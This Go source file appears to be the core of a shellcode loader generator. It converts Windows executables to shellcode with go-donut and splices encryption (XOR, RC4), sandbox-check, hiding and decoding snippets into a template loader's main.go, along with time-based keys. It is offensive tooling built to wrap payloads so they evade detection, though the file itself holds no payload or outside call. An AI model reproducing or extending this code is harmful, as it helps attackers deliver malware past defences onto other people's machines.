package core

import (
	"github.com/Binject/go-donut/donut"
	"io/ioutil"
	"log"
	"os"
	"path"
	"strings"
	"text/template"
	"time"
)

type FormatTp struct {
	tp *template.Template
}

func (f FormatTp) Exec(args map[string]interface{}) string {
	s := new(strings.Builder)
	err := f.tp.Execute(s, args)
	if err != nil {
		// 放心吧，这里不可能触发的，除非手贱:)
		panic(err)
	}
	return s.String()
}

func Format(fmt string) FormatTp {
	var err error
	temp, err := template.New("").Parse(fmt)
	if err != nil {
		// 放心吧，这里不可能触发的，除非手贱:)
		panic(err)
	}
	return FormatTp{tp: temp}
}
func Format1(fmt string) FormatTp {
	var err error
	temp, err := template.New("").Parse(fmt)
	if err != nil {
		// 放心吧，这里不可能触发的，除非手贱:)
		panic(err)
	}
	return FormatTp{tp: temp}
}

// 给loader文件插入代码，需注意import的库需要去重
func addCode(Code []string, method string) {
	loaderFileByte, _ := ioutil.ReadFile(path.Join(TempDir, "main.go"))
	loaderFile := string(loaderFileByte)
	var replaceString string
	switch method {
	case "sandbox":
		replaceString = "//__SANDBOX__"
	case "decode":
		replaceString = "//__DECODE__"
	case "separate":
		replaceString = "//__SEPARATE__"
	case "hide":
		replaceString = "//__HIDE__"
	case "funct":
		replaceString = "//__FUNC__"
	}

	loaderFile = strings.Replace(loaderFile, replaceString, Code[0], 1)
	importField := strings.SplitAfter(loaderFile, "//__IMPORT__")[0]
	unImportField := strings.SplitAfter(loaderFile, "//__IMPORT__")[1]
	imports := strings.Split(importField, "\n")
	new := make([]string, 0)
	for i := 0; i < len(imports); i++ {
		if strings.Index(Code[1], imports[i]) == -1 {
			new = append(new, imports[i]+"\n")
		}
	}
	new = append(new, "\t//__IMPORT__\n")

	final := strings.Replace(strings.Join(new, "")+unImportField, "//__IMPORT__", Code[1], 1)
	//println(final)
	ioutil.WriteFile(path.Join(TempDir, "main.go"), []byte(final), os.ModePerm)
}

func addCode1(Code []string, method string, repstr string, repstr1 string, repstr2 string, repstr3 string, repstr4 string) {
	loaderFileByte, _ := ioutil.ReadFile(path.Join(TempDir, "main.go"))
	loaderFile := string(loaderFileByte)
	var replaceString string
	switch method {
	case "sandbox":
		replaceString = "//__SANDBOX__"
	case "quanju":
		replaceString = "//__QUANJU__"
	case "main":
		replaceString = "//__MAIN__"
	case "decode":
		replaceString = "//__DECODE__"
	case "separate":
		replaceString = "//__SEPARATE__"
	case "hide":
		replaceString = "//__HIDE__"
	}
	str := Format(Code[0]).Exec(map[string]interface{}{
		"name":      repstr,
		"shellcode": repstr1,
		"xor":       repstr2,
		"rc4":       repstr3,
		"canshu":    repstr4,
	})

	loaderFile = strings.Replace(loaderFile, replaceString, str, 1)
	importField := strings.SplitAfter(loaderFile, "//__IMPORT__")[0]
	unImportField := strings.SplitAfter(loaderFile, "//__IMPORT__")[1]
	imports := strings.Split(importField, "\n")
	new := make([]string, 0)
	for i := 0; i < len(imports); i++ {
		if strings.Index(Code[1], imports[i]) == -1 {
			new = append(new, imports[i]+"\n")
		}
	}
	new = append(new, "\t//__IMPORT__\n")

	final := strings.Replace(strings.Join(new, "")+unImportField, "//__IMPORT__", Code[1], 1)
	//println(final)
	ioutil.WriteFile(path.Join(TempDir, "main.go"), []byte(final), os.ModePerm)
}

func addCode2(Code []string, method string, repstr5 string, repstr6 string) {
	println(Code)
	loaderFileByte, _ := ioutil.ReadFile(path.Join(TempDir, "main.go"))
	loaderFile := string(loaderFileByte)
	var replaceString string
	switch method {
	case "sandbox":
		replaceString = "//__SANDBOX__"
	case "quanju":
		replaceString = "//__QUANJU__"
	case "main":
		replaceString = "//__MAIN__"
	case "decode":
		replaceString = "//__DECODE__"
	case "separate":
		replaceString = "//__SEPARATE__"
	case "hide":
		replaceString = "//__HIDE__"
	}

	str := Format(Code[0]).Exec(map[string]interface{}{
		"shellcode": repstr5,
		"suiji":     repstr6,
	})

	loaderFile = strings.Replace(loaderFile, replaceString, str, 1)
	importField := strings.SplitAfter(loaderFile, "//__IMPORT__")[0]
	unImportField := strings.SplitAfter(loaderFile, "//__IMPORT__")[1]
	imports := strings.Split(importField, "\n")
	new := make([]string, 0)
	for i := 0; i < len(imports); i++ {
		if strings.Index(Code[1], imports[i]) == -1 {
			new = append(new, imports[i]+"\n")
		}
	}
	new = append(new, "\t//__IMPORT__\n")

	final := strings.Replace(strings.Join(new, "")+unImportField, "//__IMPORT__", Code[1], 1)
	//println(final)
	ioutil.WriteFile(path.Join(TempDir, "main.go"), []byte(final), os.ModePerm)

}

func PE2shellcode(srcFile string, shellName string) {
	donutConfig := donut.DefaultConfig()
	payload, err := donut.ShellcodeFromFile(srcFile, donutConfig)
	if err != nil {
		log.Println(err)
	}
	err = ioutil.WriteFile(path.Join(TempDir, shellName), payload.Bytes(), os.ModePerm)
	if err != nil {
		log.Println(err)
	}

}

func generateKey(keyName string) []byte {
	key := time.Now().String()[5:27]
	err := ioutil.WriteFile(path.Join(TempDir, keyName), []byte(key), os.ModePerm)
	println(keyName)
	if err != nil {
		log.Println(err)
	}
	return []byte(key)
}
